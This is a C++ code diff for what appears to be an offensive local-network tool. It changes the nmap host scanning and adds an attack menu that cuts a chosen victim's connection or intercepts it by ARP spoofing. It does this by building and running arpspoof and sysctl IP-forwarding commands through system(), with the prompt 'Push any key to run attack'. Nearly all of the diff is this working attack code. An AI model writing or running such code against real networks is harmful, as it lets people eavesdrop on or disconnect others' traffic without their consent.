@@ -22,7 +22,17 @@ bool Net::nmap()
 
 	//writing nmap command
 	stringstream nmapCommand;
-	nmapCommand << "nmap -sP " << _userIp.toString(false) << "/" << _mask;// << " | grep Nmap scan";
+	string nmapOption, sudo = "";
+	
+	if(_system("whoami").find("root") != string::npos)
+	{
+		sudo = "sudo ";
+		nmapOption = "-sX ";
+	}
+	else
+		nmapOption = "-sn ";
+	
+	nmapCommand << sudo << "nmap " << nmapOption << _userIp.toString(false) << "/" << _mask;// << " | grep Nmap scan";
 
 	//Scanning network
 	//cout << nmapCommand.str();
@@ -108,6 +118,7 @@ void Net::attackMenu(const Ipv4 &ip)
 {
 	Menu optionsMenu;
 
+	optionsMenu.addChoice("Cut");
 	optionsMenu.addChoice("Spoof");
 	optionsMenu.addChoice("Shutdown");
 	optionsMenu.addExit();
@@ -117,11 +128,16 @@ void Net::attackMenu(const Ipv4 &ip)
 		switch (optionsMenu.display("[" + _name + "][" + ip.getLabel() + "] Choose the interaction you want to have with it:"))
 		{
 		case 0:
-			//Spoof
-			spoof(ip);
+			//Cut
+			arpSpoof(false, ip);
 			break;
 
 		case 1:
+			//Spoof
+			arpSpoof(true, ip);
+			break;
+
+		case 2:
 			//Shutdown
 			shutdown(ip);
 			break;
@@ -129,21 +145,60 @@ void Net::attackMenu(const Ipv4 &ip)
 	}
 }
 
-void Net::spoof(const Ipv4& target) const
+void Net::arpSpoof(bool forward, const Ipv4& target) const
 {
 	//Linux command [arpspoof]
 	#ifdef __linux__
+
+	if(forward && _system("whoami").find("root") == string::npos)
+	{
+		cout << "Spoofing requires sudo at lauching of program !" << endl;
+		_getch();
+		system(clearCommand.c_str());
+		return;
+	}
+
 	string
 		ipforwardCommand = "sudo sysctl -w net.ipv4.ip_forward=1",
-		spoofCommand = "arpspoof -i " + _name + " -t " + target.toString(false) + " " + _gateIp.toString(false);
+		ipbackwardCommand = "sudo sysctl -w net.ipv4.ip_forward=0",
+		spoofCommand = "sudo arpspoof -i " + _name + " -t " + target.toString(false) + " " + _gateIp.toString(false),
+		reverseSpoofCommand = "sudo arpspoof -i " + _name + " -t " + _gateIp.toString(false) + " " + target.toString(false);
 
-	cout
-		<< "Commanding: " << spoofCommand << endl
-		<< "Leave with CTRL+C if you want to" << "Press any key to continue" << endl << endl;
+	cout << "Launching: " << endl;
+	if(forward)
+	{
+		cout
+			<< ipforwardCommand << endl
+			<< spoofCommand << endl
+			<< reverseSpoofCommand << endl
+			<< ipbackwardCommand << endl
+			<< "Leave with CTRL+C at any time if you want to" << endl
+			<< "Connection will be spyed" << endl;
+	}
+	else
+	{
+		cout 
+			<< spoofCommand << endl
+			<< "Leave with CTRL+C at any time if you want to" << endl
+			<< "Connection will be cut" << endl;
+	}
+
+	
+	cout << "Push any key to run attack" << endl << endl;
 	_getch();
 	
-	system(ipforwardCommand.c_str());
+	if(forward)
+		system(ipforwardCommand.c_str());
+	
 	system(spoofCommand.c_str());
+
+	if(forward)
+	{
+		system(reverseSpoofCommand.c_str());
+		system(ipbackwardCommand.c_str());
+	}
+
+	system(clearCommand.c_str());
 	#endif
 }
 
